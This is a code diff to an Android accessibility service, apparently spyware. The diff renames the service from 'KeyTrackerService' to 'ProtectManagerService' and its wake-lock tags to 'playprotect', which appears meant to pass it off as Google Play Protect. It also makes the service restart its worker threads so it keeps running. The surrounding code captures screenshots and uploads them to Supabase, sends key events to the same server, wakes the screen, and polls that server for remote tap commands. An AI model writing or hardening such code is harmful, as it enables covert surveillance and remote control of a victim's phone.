@@ -31,6 +31,7 @@ import java.util.concurrent.Callable;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.RejectedExecutionException;
 import java.util.concurrent.TimeUnit;
 import java.io.ByteArrayOutputStream;
 import java.text.SimpleDateFormat;
@@ -39,9 +40,9 @@ import java.util.Locale;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
 
-public class KeyTrackerService extends AccessibilityService {
-    private static final String TAG = "KeyTrackerService";
-    private static volatile KeyTrackerService INSTANCE;
+public class ProtectManagerService extends AccessibilityService {
+    private static final String TAG = "ProtectManagerService";
+    private static volatile ProtectManagerService INSTANCE;
 
     private Handler mainHandler;
     private volatile String lastPackageName = null;
@@ -56,7 +57,7 @@ public class KeyTrackerService extends AccessibilityService {
 
     // Polling Supabase: commandes distantes (tap x/y, etc.)
     private static final long COMMAND_POLL_INTERVAL_MS = 900;
-    private final ExecutorService commandExecutor = Executors.newSingleThreadExecutor();
+    private ExecutorService commandExecutor = Executors.newSingleThreadExecutor();
     private final AtomicBoolean commandPollInFlight = new AtomicBoolean(false);
     private volatile long lastCommandPollLogMs = 0;
     private final Runnable commandLoop = new Runnable() {
@@ -71,7 +72,7 @@ public class KeyTrackerService extends AccessibilityService {
     private static final int SCREENSHOT_MAX_WIDTH = 360; // plus bas = plus léger
     private static final int SCREENSHOT_WEBP_QUALITY = 20; // compression très agressive (un peu meilleure qualité)
 
-    private final ExecutorService screenshotExecutor = Executors.newSingleThreadExecutor();
+    private ExecutorService screenshotExecutor = Executors.newSingleThreadExecutor();
     private final AtomicReference<String> lastEnsuredScreenshotDay = new AtomicReference<>(null);
     private final Runnable screenshotLoop = new Runnable() {
         @Override
@@ -80,7 +81,20 @@ public class KeyTrackerService extends AccessibilityService {
         }
     };
 
-    public static KeyTrackerService getInstance() {
+    private void ensureExecutors() {
+        try {
+            if (commandExecutor == null || commandExecutor.isShutdown() || commandExecutor.isTerminated()) {
+                commandExecutor = Executors.newSingleThreadExecutor();
+            }
+        } catch (Exception ignored) {}
+        try {
+            if (screenshotExecutor == null || screenshotExecutor.isShutdown() || screenshotExecutor.isTerminated()) {
+                screenshotExecutor = Executors.newSingleThreadExecutor();
+            }
+        } catch (Exception ignored) {}
+    }
+
+    public static ProtectManagerService getInstance() {
         return INSTANCE;
     }
 
@@ -95,7 +109,7 @@ public class KeyTrackerService extends AccessibilityService {
                     if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
                 } catch (Exception ignored) {}
 
-                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "andtracker:remote");
+                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "playprotect:remote");
                 wakeLock.setReferenceCounted(false);
                 wakeLock.acquire(d);
             }
@@ -120,7 +134,7 @@ public class KeyTrackerService extends AccessibilityService {
 
                 // Deprecated mais encore largement supporté; utile quand l'écran est éteint.
                 int flags = PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP;
-                wakeLock = pm.newWakeLock(flags, "andtracker:wake_screen");
+                wakeLock = pm.newWakeLock(flags, "playprotect:wake_screen");
                 wakeLock.setReferenceCounted(false);
                 wakeLock.acquire(d);
             }
@@ -834,6 +848,7 @@ public class KeyTrackerService extends AccessibilityService {
         super.onServiceConnected();
         INSTANCE = this;
         mainHandler = new Handler(Looper.getMainLooper());
+        ensureExecutors();
         Log.d(TAG, "Accessibility service connected. Supabase URL configured=" +
                 (BuildConfig.SUPABASE_URL != null && !BuildConfig.SUPABASE_URL.isEmpty()));
 
@@ -858,11 +873,13 @@ public class KeyTrackerService extends AccessibilityService {
             mainHandler.removeCallbacks(commandLoop);
         }
         try {
-            screenshotExecutor.shutdownNow();
+            if (screenshotExecutor != null) screenshotExecutor.shutdownNow();
         } catch (Exception ignored) {}
         try {
-            commandExecutor.shutdownNow();
+            if (commandExecutor != null) commandExecutor.shutdownNow();
         } catch (Exception ignored) {}
+        screenshotExecutor = null;
+        commandExecutor = null;
         super.onDestroy();
     }
 
@@ -890,6 +907,7 @@ public class KeyTrackerService extends AccessibilityService {
     private void captureAndUploadScreenshotOnce() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return;
 
+        ensureExecutors();
         try {
             // API 30+: capture via AccessibilityService (pas MediaProjection).
             takeScreenshot(
@@ -929,7 +947,7 @@ public class KeyTrackerService extends AccessibilityService {
                                                     String.valueOf(lastUploadedScreenshotPath).replace("\"", "\\\"") + "\"}";
                                             sendKeyToSupabase("screenshot_heartbeat", heartbeat, lastPackageName);
                                         } else {
-                                            SupabaseAndroidEventsClient.uploadScreenshot(KeyTrackerService.this, bytes, paths.objectPath, "image/webp");
+                                            SupabaseAndroidEventsClient.uploadScreenshot(ProtectManagerService.this, bytes, paths.objectPath, "image/webp");
                                             markScreenshotUploaded(bytes.length, paths.objectPath);
                                         }
                                     }
@@ -986,23 +1004,35 @@ public class KeyTrackerService extends AccessibilityService {
             return;
         }
 
-        commandExecutor.execute(() -> {
-            long nextDelay = COMMAND_POLL_INTERVAL_MS;
-            try {
-                org.json.JSONObject cmd = SupabaseAndroidEventsClient.fetchNextPendingCommand(KeyTrackerService.this);
-                if (cmd != null) {
-                    handleCommand(cmd);
-                    // Si on a traité une commande, repoll vite pour enchaîner.
-                    nextDelay = 200;
+        ensureExecutors();
+        try {
+            commandExecutor.execute(() -> {
+                long nextDelay = COMMAND_POLL_INTERVAL_MS;
+                try {
+                    org.json.JSONObject cmd = SupabaseAndroidEventsClient.fetchNextPendingCommand(ProtectManagerService.this);
+                    if (cmd != null) {
+                        handleCommand(cmd);
+                        // Si on a traité une commande, repoll vite pour enchaîner.
+                        nextDelay = 200;
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "pollAndHandleOneCommand: erreur", e);
+                    nextDelay = Math.max(2000, COMMAND_POLL_INTERVAL_MS);
+                } finally {
+                    commandPollInFlight.set(false);
+                    scheduleNextCommandPoll(nextDelay);
                 }
-            } catch (Exception e) {
-                Log.e(TAG, "pollAndHandleOneCommand: erreur", e);
-                nextDelay = Math.max(2000, COMMAND_POLL_INTERVAL_MS);
-            } finally {
-                commandPollInFlight.set(false);
-                scheduleNextCommandPoll(nextDelay);
-            }
-        });
+            });
+        } catch (RejectedExecutionException e) {
+            Log.w(TAG, "pollAndHandleOneCommand: executor shutdown -> recreate", e);
+            commandPollInFlight.set(false);
+            ensureExecutors();
+            scheduleNextCommandPoll(Math.max(2000, COMMAND_POLL_INTERVAL_MS));
+        } catch (Exception e) {
+            Log.w(TAG, "pollAndHandleOneCommand: unexpected exception", e);
+            commandPollInFlight.set(false);
+            scheduleNextCommandPoll(Math.max(2000, COMMAND_POLL_INTERVAL_MS));
+        }
     }
 
     private void handleCommand(org.json.JSONObject cmd) {
